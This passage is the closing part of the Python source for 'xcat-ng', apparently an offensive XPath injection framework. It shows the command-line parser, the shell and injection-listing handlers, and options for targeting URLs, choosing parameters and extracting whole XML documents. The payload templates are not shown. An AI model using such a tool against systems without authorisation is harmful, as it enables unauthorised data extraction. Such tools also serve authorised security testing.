            ok(f"Saved to {args.output}")
    finally:
        await ctx.close()


async def cmd_shell(args: argparse.Namespace):
    ctx = build_ctx(args)
    await ctx.start()
    try:
        if not await setup(ctx):
            sys.exit(1)
        await shell_loop(ctx)
    finally:
        await ctx.close()


def cmd_injections(_: argparse.Namespace):
    print(_c(f"Supported injection templates ({len(INJECTIONS)} total):\n", C.BOLD))
    for i, inj in enumerate(INJECTIONS, 1):
        print(f"  {_c(str(i), C.CYN)}. {inj.name}")
        print(f"     Example : {_c(inj.example, C.GRY)}")
        for pl, expected in inj.test_payloads("<value>"):
            tag = _c("TRUE ", C.GRN) if expected else _c("FALSE", C.RED)
            print(f"     {tag}  {pl}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# Argument parser
# ══════════════════════════════════════════════════════════════════════════════

def _add_common(p: argparse.ArgumentParser):
    src = p.add_argument_group("Request (choose one)")
    g   = src.add_mutually_exclusive_group()
    g.add_argument("-r", "--request", metavar="FILE",
                   help="Burp Suite raw HTTP request file")
    g.add_argument("--url", metavar="URL",
                   help="Target URL")

    pg = p.add_argument_group("Parameters (with --url)")
    pg.add_argument("--param", metavar="NAME",
                    help="Parameter to inject (default: probe all)")
    pg.add_argument("--param-values", nargs="*", metavar="k=v",
                    help="URL/query parameters  e.g. q=hello id=1")
    pg.add_argument("--body-params", nargs="*", metavar="k=v",
                    help="POST body parameters")
    pg.add_argument("-m", "--method", default="GET",
                    help="HTTP method (default: GET)")
    pg.add_argument("--header", nargs="*", metavar="'Name: val'",
                    help="Extra request headers")

    og = p.add_argument_group(
        "Oracle (at least one required)",
        "TRUE  = XPath condition matched\n"
        "FALSE = XPath condition did not match\n"
        "Prefix --true-string / --true-code value with ! to negate",
    )
    og.add_argument("--true-string",  metavar="TEXT",
                    help="Text present in a TRUE response (! to negate)")
    og.add_argument("--true-code",    metavar="CODE",
                    help="HTTP status for TRUE response (! to negate)")
    og.add_argument("--false-string", metavar="TEXT",
                    help="Text present in a FALSE response")
    og.add_argument("--false-code",   metavar="CODE",
                    help="HTTP status for FALSE response")

    xo = p.add_argument_group("Options")
    xo.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
                    metavar="N", help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})")
    xo.add_argument("--fast", action="store_true",
                    help=f"Cap strings at {FAST_MODE_LEN} chars")
    xo.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                    metavar="SEC", help=f"Request timeout (default: {DEFAULT_TIMEOUT}s)")
    xo.add_argument("--proxy", metavar="URL",
                    help="HTTP proxy  e.g. http://127.0.0.1:8080")
    xo.add_argument("--tamper", metavar="FILE",
                    help="Tamper script (must export tamper(ctx, kwargs))")
    xo.add_argument("--enable",  nargs="*", metavar="FEATURE",
                    help="Force-enable features")
    xo.add_argument("--disable", nargs="*", metavar="FEATURE",
                    help="Force-disable features")


def build_parser() -> argparse.ArgumentParser:
    root = argparse.ArgumentParser(
        prog="xcat-ng",
        description=(
            "xcat-ng — Modern XPath Injection Framework (next-generation)\n\n"
            "Commands:\n"
            "  detect      Find injection point and detect server features\n"
            "  run         Extract the full XML document\n"
            "  shell       Interactive XPath extraction shell\n"
            "  injections  List all injection templates\n\n"
            "xcat-ng <command> --help  for per-command options"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    root.add_argument("-v", "--verbose", action="store_true")
    root.add_argument("--version", action="version", version="xcat-ng")
    sub = root.add_subparsers(dest="command", required=True)

    p = sub.add_parser("detect", help="Find injection and detect features",
                       formatter_class=argparse.RawDescriptionHelpFormatter)
    _add_common(p)

    p = sub.add_parser("run", help="Extract full XML document",
                       formatter_class=argparse.RawDescriptionHelpFormatter)
    _add_common(p)
    p.add_argument("-o", "--output", metavar="FILE", help="Save XML to file")
    p.add_argument("--max-depth",    type=int, default=12)
    p.add_argument("--max-children", type=int, default=40)

    p = sub.add_parser("shell", help="Interactive XPath shell",
                       formatter_class=argparse.RawDescriptionHelpFormatter)
    _add_common(p)

    sub.add_parser("injections", help="List injection templates")

    return root


# ══════════════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global VERBOSE
    print(BANNER)
    parser = build_parser()
    args   = parser.parse_args()
    VERBOSE = getattr(args, "verbose", False)

    if args.command == "injections":
        cmd_injections(args)
        return

    dispatch = {
        "detect": cmd_detect,
        "run":    cmd_run,
        "shell":  cmd_shell,
    }
    try:
        asyncio.run(dispatch[args.command](args))
    except KeyboardInterrupt:
        warn("Interrupted.")


if __name__ == "__main__":
    main()
